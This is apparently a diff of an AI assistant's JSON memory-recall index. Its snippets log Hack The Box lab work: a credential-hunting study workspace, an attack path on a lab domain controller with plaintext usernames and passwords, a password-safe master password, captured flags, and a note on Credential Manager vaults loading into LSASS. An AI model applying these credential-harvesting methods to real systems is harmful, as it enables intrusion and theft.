+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:45:45",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 45,
+      "endLine": 45,
+      "source": "memory",
+      "snippet": "Assistant: This is a **new section** under Password Attacks — \"Credential Hunting in Network Traffic\". Let me scaffold a new lab workspace for it.",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "network",
+        "assistant",
+        "new",
+        "section",
+        "under",
+        "password",
+        "attacks",
+        "credential"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:46:46": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:46:46",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 46,
+      "endLine": 46,
+      "source": "memory",
+      "snippet": "Assistant: **Workspace scaffolded for Credential Hunting in Network Traffic** ``` htb/academy/password-attacks-network-traffic/ ├── module.md ✅ Protocols, concepts, tools (Wireshark, Pcredz) ├── exercises.md ✅ 14+ exercises with answers ├── assessment.md ✅ Section exercises templ",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "network",
+        "module.md",
+        "exercises.md",
+        "assessment.md",
+        "assistant",
+        "scaffolded",
+        "credential",
+        "hunting"
+      ]
+    },
+    "memory:memory/2026-04-14.md:359:360": {
+      "key": "memory:memory/2026-04-14.md:359:360",
+      "path": "memory/2026-04-14.md",
+      "startLine": 359,
+      "endLine": 360,
+      "source": "memory",
+      "snippet": "- # 2026-04-02 - Daily Log ## HTB: Cicada Box - Current State **Session Ended:** Continuing later ### Target - **IP:** 10.129.231.149 - **Hostname:** cicada.htb - **OS:** Windows Server 2022 (Domain Controller) - **Status:** Enumeration phase, credentials chain discovered ### Credentials Discovered | User | Password | Source | Status | |------|----------|--------|--------| | michael.wrightson | `Cicada$M6Corpb*@Lp#nZp!8` | HR share (default creds) | Valid SMB | | david.orelious | `aRt$Lp#7t*VQ!3` | AD description field | Valid SMB | | emily.oscars | `Q!3@Lp#M6b*7t*Vt` | Backup_script.ps1 | **UNTESTED** | ### Attack Path So Far 1. ✅ Anonymous SMB access to HR share → found default password [c",
+      "recallCount": 2,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 1.0258073881268501,
+      "maxScore": 0.5297693327069282,
+      "firstRecalledAt": "2026-04-17T22:42:34.125Z",
+      "lastRecalledAt": "2026-04-17T22:46:31.682Z",
+      "queryHashes": [
+        "d0424c2b95db",
+        "0a939375f682"
+      ],
+      "recallDays": [
+        "2026-04-18"
+      ],
+      "conceptTags": [
+        "backup",
+        "10.129.231.149",
+        "cicada.htb",
+        "michael.wrightson",
+        "david.orelious",
+        "emily.oscars",
+        "backup-script.ps1",
+        "log"
+      ]
+    },
+    "memory:memory/2026-04-18.md:218:232": {
+      "key": "memory:memory/2026-04-18.md:218:232",
+      "path": "memory/2026-04-18.md",
+      "startLine": 218,
+      "endLine": 232,
+      "source": "memory",
+      "snippet": "- Candidate: - # 2026-04-02 - Daily Log ## HTB: Cicada Box - Current State **Session Ended:** Continuing later ### Target - **IP:** 10.129.231.149 - **Hostname:** cicada.htb - **OS:** Windows Server 2022 (Domain Controller) - **Status:** Enumeration phase, credentials chain discovered ### Credentials Discovered | User | Password | Source | Status | |------|----------|--------|--------| | michael.wrightson | `Cicada$M6Corpb*@Lp#nZp!8` | HR share (default creds) | Valid SMB | | david.orelious | `aRt$Lp#7t*VQ!3` | AD description field | Valid SMB | | emily.oscars | `Q!3@Lp#M6b*7t*Vt` | Backup_script.ps1 | **UNTESTED** | ### Attack Path So Far 1. ✅ Anonymous SMB access to HR share → found defaul",
+      "recallCount": 1,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 0.5240372568368912,
+      "maxScore": 0.5240372568368912,
+      "firstRecalledAt": "2026-04-17T22:46:31.682Z",
+      "lastRecalledAt": "2026-04-17T22:46:31.682Z",
+      "queryHashes": [
+        "0a939375f682"
+      ],
+      "recallDays": [
+        "2026-04-18"
+      ],
+      "conceptTags": [
+        "backup",
+        "10.129.231.149",
+        "cicada.htb",
+        "michael.wrightson",
+        "david.orelious",
+        "emily.oscars",
+        "backup-script.ps1",
+        "candidate"
+      ]
+    },
+    "memory:memory/2026-04-18.md:193:202": {
+      "key": "memory:memory/2026-04-18.md:193:202",
+      "path": "memory/2026-04-18.md",
+      "startLine": 193,
+      "endLine": 202,
+      "source": "memory",
+      "snippet": "- Candidate: - Candidate: Loot: `Backup.psafe3` stored in box loot folder; Master password: `tekieromucho` - confidence: 0.62 - evidence: memory/2026-04-09.md:29-30 - recalls: 0 - status: staged - Candidate: HTB Certified Box - COMPLETED ✅: **Status:** Root access obtained, both flags captured - confidence: 0.62 - evidence: memory/2026-04-06.md:5-5 - recalls: 0 - status: staged - Candidate: Flags Captured: **user.txt:** `4c827f9708a774df0e26ba85de7f03dc`; **root.txt:** `648b3a5fd8adc7c40b8ad55b68ab405e` - confidence: 0.62 - evidence: memory/2026-04-06.md:8-9 - recalls: 0 - status: staged - Candidate: User Access (Shadow Credentials): **BloodHound enumeration** - judith.mader has W - confid",
+      "recallCount": 1,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 0.5199343383312225,
+      "maxScore": 0.5199343383312225,
+      "firstRecalledAt": "2026-04-17T22:46:31.682Z",
+      "lastRecalledAt": "2026-04-17T22:46:31.682Z",
+      "queryHashes": [
+        "0a939375f682"
+      ],
+      "recallDays": [
+        "2026-04-18"
+      ],
+      "conceptTags": [
+        "backup",
+        "backup.psafe3",
+        "0.62",
+        "memory/2026-04-09.md",
+        "29-30",
+        "memory/2026-04-06.md",
+        "5-5",
+        "user.txt"
+      ]
+    },
+    "memory:memory/2026-04-18.md:188:197": {
+      "key": "memory:memory/2026-04-18.md:188:197",
+      "path": "memory/2026-04-18.md",
+      "startLine": 188,
+      "endLine": 197,
+      "source": "memory",
+      "snippet": "- Candidate: Assistant: Playbook updated with the **Lazy Loading** behavior: **Key finding:** Windows only loads Credential Manager vaults into LSASS memory **on-demand** — when `cmdkey` or another application accesses them. **Without `cmdkey /list` first:** - Vault stays encrypted on disk - - confidence: 0.58 - evidence: memory/.dreams/session-corpus/2026-04-17.txt:40-40 - recalls: 0 - status: staged - Candidate: - Candidate: Loot: `Backup.psafe3` stored in box loot folder; Master password: `tekieromucho` - confidence: 0.62 - evidence: memory/2026-04-09.md:29-30 - recalls: 0 - status: staged - Candidate: HTB Certified Box - COMPLETED ✅: **Status:** Root access obtained, both flags c",
+      "recallCount": 1,
+      "dailyCount": 0,
+      "groundedCount": 0,
+      "totalScore": 0.5197869300842285,
+      "maxScore": 0.5197869300842285,
+      "firstRecalledAt": "2026-04-17T22:46:31.682Z",
+      "lastRecalledAt": "2026-04-17T22:46:31.682Z",
+      "queryHashes": [
+        "0a939375f682"
+      ],
+      "recallDays": [
+        "2026-04-18"
+      ],
+      "conceptTags": [
+        "backup",
+        "on-demand",
+        "0.58",
+        "40-40",
+        "backup.psafe3",
+        "0.62",
+        "memory/2026-04-09.md",
+        "29-30"
       ]
     }
   }
